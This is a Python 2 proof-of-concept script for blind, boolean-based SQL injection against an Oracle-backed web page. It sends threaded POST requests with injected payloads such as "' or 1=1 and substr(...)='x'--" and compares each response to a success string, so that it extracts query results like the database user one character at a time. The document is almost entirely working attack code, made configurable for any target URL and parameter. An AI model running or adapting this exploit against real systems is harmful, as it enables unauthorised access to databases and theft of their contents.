################################################################################################
#  Description:  
#  A rough threaded HTTP POST based POC for dumping results from an Oracle database 
#  using boolean based SQL injection. 
#
#  Note:  Sometimes nested queries have issues if the Oracle database can't handle a large
#  number of queries being run in parallel.
#
#  Author: b0yd
#
################################################################################################

import requests
import urllib
from threading import Thread
import sys
import time

proxies = None
#Comment out if not using a proxy like Burp, etc
proxies = {
  'http': 'http://127.0.0.1:8080',
  'https': 'http://127.0.0.1:8080',
}

#Example User Agent string
headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
           'Content-Type':'application/x-www-form-urlencoded'}

#Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

#Target URL
url = "https://example.com/vulnerable_page.html"

#Set this to the expected string in the returned page that indicates the query ran sucessfully
success_str = "2325 matches"

#Set this to the error string that is in the return page if the SQL query has an error
exception_str = "exception"

#Set this to the parameter name for the POST request
post_param_name = "param1"

#SQL query to execute
query = "select user from dual"

#Set this to the beginning ascii ordinal value, ie 41=A
begin_num = 32
#Set this to the end ascii ordinal value, ie 41=A
end_num = 127

threads = [None] * (end_num - begin_num)
results = [None] * (end_num - begin_num)

#Can be used to find the length of the returned SQL string
def get_str_length(query):

  for i in range(1, 300):
    data = "' or 1=1 and length((%s))=%d--" % (query, i)
    ret = make_request(url, data)
    if success_str in ret:
      return i
    elif exception_str in ret:
      break
    else:
      continue

  return 0

def make_request( addr, data ):      
        
  #add post data
  p_data = urllib.urlencode({post_param_name : data})  
  
  #Setup request
  r = requests.post(addr, data = p_data, proxies=proxies, verify=False, headers=headers)
  return r.text

#Read file
def get_string(cur_str, counter, num, query, results):

  letter = cur_str + chr(num + begin_num)
  data = "' or 1=1 and substr((%s),1,%s)='%s'--" % (query, counter, letter)
  ret = make_request(url, data)
  if success_str in ret:
    results[num] = 1
  else:
    results[num] = 0

    
#Print the query
print "[+] Running query: '%s'" % query

j = 1
cur_str = ''
while 1:

  for i in range(len(threads)):
    threads[i] = Thread(target=get_string, args=(cur_str, j, i, query, results))
    threads[i].start()

  #Wait for each to finish
  for i in range(len(threads)):
       threads[i].join()

  try:
    winner = results.index(1)
  except:
    print "[-] No letter found. Exiting"
    break
    
  #print "[+] Winning letter: %s" % chr(winner + begin_num)
  cur_str += chr(winner + begin_num)
  time.sleep(0.1)
  j += 1

print "[+] Result: %s" % cur_str